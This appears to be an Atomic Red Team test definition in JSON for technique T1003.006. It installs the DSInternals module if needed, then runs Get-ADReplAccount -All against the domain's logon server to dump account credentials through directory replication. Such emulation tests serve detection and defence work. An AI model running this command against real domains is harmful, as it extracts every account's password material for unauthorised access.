{
  "id": "a0bced08-3fc5-4d8b-93b7-e8344739376e",
  "name": "Run DSInternals Get-ADReplAccount",
  "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "e2b14b2a-b6ec-43cd-90d5-3558807fae07",
      "type": "execute-command",
      "data": {
        "command": "Get-ADReplAccount -All -Server #{logonserver}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "dc74a6e8-b917-4b5e-a1cf-04d083297e9c",
      "name": "Check dependency 1/1",
      "description": "DSInternals must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "$RequiredModule = Get-Module -Name DSInternals -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "52f860e4-43ac-4e11-924c-190c2a39d61b",
      "name": "Resolve dependency 1/1",
      "description": "DSInternals must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name DSInternals -Scope CurrentUser -Force\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "bf06e9eb-1d90-4777-9cde-81a4b8cb012c",
      "name": "Re-check dependency 1/1",
      "description": "DSInternals must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "$RequiredModule = Get-Module -Name DSInternals -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "dc74a6e8-b917-4b5e-a1cf-04d083297e9c",
      "p": "on-success",
      "o": "e2b14b2a-b6ec-43cd-90d5-3558807fae07"
    },
    {
      "s": "dc74a6e8-b917-4b5e-a1cf-04d083297e9c",
      "p": "on-failure",
      "o": "52f860e4-43ac-4e11-924c-190c2a39d61b"
    },
    {
      "s": "52f860e4-43ac-4e11-924c-190c2a39d61b",
      "p": "on-success",
      "o": "bf06e9eb-1d90-4777-9cde-81a4b8cb012c"
    },
    {
      "s": "bf06e9eb-1d90-4777-9cde-81a4b8cb012c",
      "p": "on-failure",
      "o": "e2b14b2a-b6ec-43cd-90d5-3558807fae07"
    }
  ],
  "tags": [
    "T1003.006",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "logonserver",
      "type": "string",
      "description": "ComputerName argument default %logonserver%",
      "value": "$ENV:logonserver.TrimStart(\"\\\")"
    }
  ]
}